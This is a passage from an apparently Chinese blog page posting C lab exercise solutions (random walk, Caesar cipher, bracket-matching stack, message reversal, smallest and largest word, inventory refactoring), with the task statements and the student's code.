class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">RandomWalk</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> toward = rand() % <span class="hljs-number">4</span>;<br>        <span class="hljs-type">int</span> result = SelectToward(begin, Map, toward, i, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            <span class="hljs-comment">// PrintMap(Map);</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// PrintMap(Map);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> walkMap[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>] = &#123;&#123;<span class="hljs-string">&#x27;.&#x27;</span>&#125;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            walkMap[i][j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    walkMap[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    <span class="hljs-comment">// PrintMap(walkMap);</span><br>    RandomWalk(begin, walkMap);<br>    PrintMap(walkMap);<br>    <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], walkMap[11][1]);</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="加密（Encryption）"><a href="#加密（Encryption）" class="headerlink" title="加密（Encryption）"></a>加密（Encryption）</h3><blockquote><p>已知的最古老的一种加密技术是凯撒加密（得名于 Julius caesar）。该方法把一条消息中的每个字母用字母表中固定距离之后的那个字母来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）</p><p>编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数⽬）：</p><blockquote><p>Enter message to be encrypted: Go ahead, make my day.<br>Enter shift amount (1-25): 3<br>Encrypted message: Jr dkhdg, pdnh pb gdb.</p></blockquote><p>注意,当⽤户输⼊26与移位计数的差值时,程序可以对消息进⾏解密:</p><blockquote><p>Enter message to be encrypted: Jr dkhdg, pdnh pb gdb.<br>Enter shift amount (1-25): 23<br>Encrypted message: Go ahead, make my day</p></blockquote><p>不是字母的那些字符不要改动。此外，加密时不要改变字母的大小写。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter message to be encrypted: Hello, world!<br>Enter shift amount (1-25): 3<br>Encrypted message: Khoor, zruog!</p></blockquote><blockquote><p>Enter message to be encrypted: Khoor, zruog!<br>Enter shift amount (1-25): 23<br>Encrypted message: Hello, world!</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> amounts;<br>    fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>);<br>    fflush(<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;amounts);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">64</span> &amp;&amp; str[i] &lt; <span class="hljs-number">91</span>)<br>        &#123;<br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">90</span> ? <span class="hljs-number">64</span> + ((str[i] + amounts) - <span class="hljs-number">90</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">96</span> &amp;&amp; str[i] &lt; <span class="hljs-number">123</span>)<br>        &#123;<br><br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">122</span> ? <span class="hljs-number">96</span> + ((str[i] + amounts) - <span class="hljs-number">122</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-built_in">putchar</span>(str[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="栈（Stack）"><a href="#栈（Stack）" class="headerlink" title="栈（Stack）"></a>栈（Stack）</h3><blockquote><p>修改如下程序，使它存储字符而不是整数。</p><p>增加 main 函数，用来要求用户输入一串圆括号或花括号，然后指出它们之间的嵌套是否正确。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter parentheses and&#x2F;or braces: <code>()(&#123;&#125;)(&#123;&#125;)</code><br>Parentheses&#x2F;braces are nested properly</p></blockquote><blockquote><p>Enter parentheses and&#x2F;or braces: <code>((&#125;</code><br>Parentheses&#x2F;braces are NOT nested properly</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span> <span class="hljs-comment">/* C99 only */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE 100</span><br><br><span class="hljs-comment">/* external variables */</span><br><span class="hljs-type">char</span> contents[STACK_SIZE];<br><span class="hljs-type">int</span> top = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_overflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack overflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_underflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack underflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    top = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_full</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == STACK_SIZE;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_full())<br>        stack_overflow();<br>    <span class="hljs-keyword">else</span><br>        contents[top++] = ch;<br>&#125;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_empty())<br>        stack_underflow();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> contents[--top];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* prevents compiler warning due to stack_underflow() call */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;(&#x27;</span> || ch == <span class="hljs-string">&#x27;[&#x27;</span> || ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>        &#123;<br>            push(ch);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;)&#x27;</span> || ch == <span class="hljs-string">&#x27;]&#x27;</span> || ch == <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (is_empty())<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-type">char</span> a = pop();<br>            <span class="hljs-keyword">if</span> ((ch == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;(&#x27;</span>) || (ch == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;[&#x27;</span>) || (ch == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;&#123;&#x27;</span>))<br>            &#123;<br>                top++;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (top == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are nested properly&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>    &#125;<br>    make_empty();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="逆序（Reversal）"><a href="#逆序（Reversal）" class="headerlink" title="逆序（Reversal）"></a>逆序（Reversal）</h3><blockquote><p>编写程序读一条消息，然后逆序打印出这条消息。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a message: Don’t get mad, get even.<br>Reversal is: .neve teg ,dam teg t’noD</p></blockquote><blockquote><p>Enter a message: Hello, world!<br>Reversal is: !dlrow ,olleH</p></blockquote><p>提示：一次读取消息中的一个字符（用getchar函数），并且把这些字符存储在数组中，当数组写满或者读到字符 ‘\n’ 时停止读入。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch, arr[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        arr[i] = ch;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &gt; <span class="hljs-number">-1</span>; j--)<br>    &#123;<br>        <span class="hljs-built_in">putchar</span>(arr[j]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大最小单词简略版（The-Biggest-and-Smallest-Words）"><a href="#最大最小单词简略版（The-Biggest-and-Smallest-Words）" class="headerlink" title="最大最小单词简略版（The Biggest and Smallest Words）"></a>最大最小单词简略版（The Biggest and Smallest Words）</h3><blockquote><p>编写程序找出一组单词中“最小”单词和“最大”单词。</p><p>用户输入单词后，程序根据字典顺序决定排在最前面和最后面的单词。</p><p>当用户输入4个字母的单词时，程序停止读入。假设所有单词都不超过20个字母。</p><p><em><strong>输出范例1</strong>：</em></p><blockquote><p>Enter word: dog<br>Enter word: zebra<br>Enter word: rabbit<br>Enter word: catfish<br>Enter word: walrus<br>Enter word: cat<br>Enter word: fish</p><p>Smallest word: cat<br>Largest word zebra</p></blockquote><p><em><strong>输出范例2：</strong></em></p><blockquote><p>Enter word: computer<br>Enter word: ink<br>Enter word: light<br>Enter word: bookrack<br>Enter word: book</p><p>Smallest word: book<br>Largest word: light</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">isMin</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (chNew[i] &lt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">isMax</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (chNew[i] &gt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getSmallest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (isMin(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getBiggest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (isMax(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> words[<span class="hljs-number">30</span>][<span class="hljs-number">30</span>];<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>, counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len != <span class="hljs-number">4</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, words[counts++]);<br>        len = <span class="hljs-built_in">strlen</span>(words[counts - <span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// words[counts++] = ch;</span><br>        <span class="hljs-comment">//  foundSmallest(len);</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smallest word: %s\n&quot;</span>, getSmallest(words, counts));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Largest word: %s&quot;</span>, getBiggest(words, counts));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h2><h3 id="01-main函数改造。"><a href="#01-main函数改造。" class="headerlink" title="01 main函数改造。"></a>01 main函数改造。</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>main</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> <span class="hljs-title">inventory</span>[<span class="hljs-title">MAX_PARTS</span>];</span><br>    <span class="hljs-type">int</span> number_parts = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> code;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter operation code:&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            ;<br>        <span class="hljs-keyword">switch</span> (code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>            insert(inventory, &amp;number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            search(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>            update(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:<br>            print(inventory, number_parts);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Illegal code\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="02-insert-函数改造"><a href="#02-insert-函数改造" class="headerlink" title="02 insert 函数改造"></a>02 insert 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>insert</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 